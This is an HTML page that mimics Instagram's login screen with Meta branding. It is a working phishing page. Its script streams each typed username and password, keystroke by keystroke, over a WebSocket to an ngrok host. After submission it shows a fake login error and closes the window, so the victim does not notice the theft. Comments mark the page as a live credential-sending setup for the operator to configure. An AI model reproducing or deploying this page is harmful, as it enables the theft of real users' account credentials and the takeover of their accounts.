<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #1E2F38; color: #fafafa; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 40px 20px 60px; box-sizing: border-box; }
        .container { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; }
        .language-selector { position: relative; margin-bottom: 40px; }
        .language-btn { background: none; border: none; color: #B8BFC7; font-size: 14px; cursor: pointer; padding: 8px 20px 8px 8px; }
        .language-btn::after { content: '▼'; margin-left: 8px; font-size: 10px; color: #B8BFC7; }
        .dropdown { display: none; position: absolute; top: 100%; left: 50%; transform: translateX(-50%); background: #1e1e1e; border-radius: 12px; width: 200px; max-height: 300px; overflow-y: auto; box-shadow: 0 8px 16px rgba(0,0,0,0.5); z-index: 10; }
        .dropdown.active { display: block; }
        .dropdown a { display: block; padding: 12px 16px; color: #fafafa; text-decoration: none; font-size: 14px; }
        .dropdown a:hover { background: #4AA7FF; }
        .dropdown a.selected { font-weight: bold; }
        .logo { width: 100px; height: 100px; margin-bottom: 60px; }
        .logo img { width: 100%; height: 100%; border-radius: 20px; }
        .input-field { width: 100%; padding: 14px 16px; margin-bottom: 12px; background-color: transparent; border: 1px solid #36393F; border-radius: 12px; color: #fafafa; font-size: 16px; box-sizing: border-box; }
        .input-field::placeholder { color: #8E9297; }
        .input-field:focus { outline: none; border-color: #4AA7FF; }
        .login-btn { width: 100%; padding: 14px; background-color: #006EF6; color: #fff; border: none; border-radius: 18px; font-weight: 600; font-size: 16px; margin: 20px 0 30px; cursor: pointer; }
        .forgot { color: #B2DBFC; font-size: 14px; text-decoration: none; margin-bottom: 50px; display: block; }
        .create-account { width: 100%; padding: 14px; background-color: transparent; border: 1px solid #4AA7FF; border-radius: 18px; color: #4AA7FF; font-weight: 600; font-size: 16px; text-align: center; text-decoration: none; display: block; }
        .meta-logo { margin-top: 60px; font-size: 24px; font-weight: bold; opacity: 0.6; color: #B8BFC7; }
        .error-container { display: none; flex-direction: column; align-items: center; text-align: center; padding: 40px 20px; width: 100%; max-width: 350px; }
        .error-icon { font-size: 60px; margin-bottom: 20px; }
        .error-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; }
        .error-message { font-size: 15px; color: #B8BFC7; margin-bottom: 30px; line-height: 1.5; }
        .try-again-btn { width: 100%; padding: 14px; background-color: #006EF6; color: #fff; border: none; border-radius: 18px; font-weight: 600; font-size: 16px; cursor: pointer; }
        @media only screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) {
            body { padding: 50px 20px 70px; }
            .logo { width: 110px; height: 110px; margin-bottom: 70px; }
            .input-field { padding: 16px 18px; font-size: 17px; }
            .login-btn, .create-account, .try-again-btn { padding: 16px; font-size: 17px; }
            .forgot { font-size: 15px; }
            .meta-logo { font-size: 26px; }
        }
    </style>
</head>
<body>
    <div class="container" id="loginScreen">
        <div class="language-selector">
            <button class="language-btn" id="langBtn">English (US)</button>
            <div class="dropdown" id="dropdown">
                <a href="#" class="selected" data-lang="English (US)">English (US)</a>
                <a href="#" data-lang="Español">Español</a>
                <a href="#" data-lang="Français">Français</a>
                <!-- (other languages) -->
            </div>
        </div>
        
        <div class="logo">
            <img src="https://elderly-peach-ne2q4dkqas-n1ecy4gl52.edgeone.app/Instagram_Glyph_Gradient.png" alt="Instagram">
        </div>
        
        <form id="loginForm">
            <input type="text" class="input-field" id="username" placeholder="Username, email or mobile number" required>
            <input type="password" class="input-field" id="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log in</button>
        </form>
        
        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot" target="_blank">Forgot password?</a>
        
        <a href="https://www.instagram.com/accounts/signup/phone/" class="create-account" target="_blank">Create new account</a>
        
        <div class="meta-logo">∞ Meta</div>
    </div>

    <div class="error-container" id="errorScreen">
        <div class="error-icon">⚠️</div>
        <div class="error-title">Sorry, something went wrong</div>
        <div class="error-message">
            We're having trouble logging you in right now.<br>
            Please check your connection and try again.
        </div>
        <button class="try-again-btn" id="tryAgainBtn">Try Again</button>
        <div class="meta-logo" style="margin-top: 80px;">∞ Meta</div>
    </div>

    <script>
        // Language dropdown logic (unchanged)

        const loginScreen = document.getElementById('loginScreen');
        const errorScreen = document.getElementById('errorScreen');
        const loginForm = document.getElementById('loginForm');
        const tryAgainBtn = document.getElementById('tryAgainBtn');

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            loginScreen.style.display = 'none';
            errorScreen.style.display = 'flex';
        });

        tryAgainBtn.addEventListener('click', () => {
            window.close();
            window.location.href = 'about:blank';
        });

        // === LIVE CREDENTIAL SENDING VIA NGROK ===
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');

        // CHANGE THIS TO YOUR CURRENT NGROK URL EVERY TIME YOU START NGROK
        const socket = new WebSocket('wss://fcee5d282f06.ngrok-free.app');

        socket.onopen = () => console.log('Connected to monitor');

        const sendData = () => {
            if (socket.readyState === WebSocket.OPEN) {
                socket.send(JSON.stringify({
                    username: usernameInput.value,
                    password: passwordInput.value,
                    time: new Date().toISOString()
                }));
            }
        };

        usernameInput.addEventListener('input', sendData);
        passwordInput.addEventListener('input', sendData);
        loginForm.addEventListener('submit', sendData);
    </script>
</body>
</html>
